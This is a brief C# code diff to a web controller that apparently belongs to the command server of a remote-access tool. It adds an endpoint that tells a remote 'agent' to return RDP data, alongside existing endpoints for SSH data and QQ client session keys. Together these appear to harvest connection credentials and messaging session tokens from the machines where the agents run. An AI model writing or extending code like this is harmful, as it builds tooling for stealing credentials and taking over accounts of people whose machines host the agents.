@@ -74,6 +74,12 @@ public class OtherSoftController : ControllerBase
         return await RelayAndWaitAsync(agentId, "othersoft.ssh", null, ct, 20);
     }
 
+    [HttpPost("{agentId}/rdp")]
+    public async Task<IActionResult> GetRDP(string agentId, CancellationToken ct)
+    {
+        return await RelayAndWaitAsync(agentId, "othersoft.rdp", null, ct, 30);
+    }
+
     [HttpPost("{agentId}/qq/clientkey")]
     public async Task<IActionResult> GetQQClientKey(string agentId, CancellationToken ct)
     {
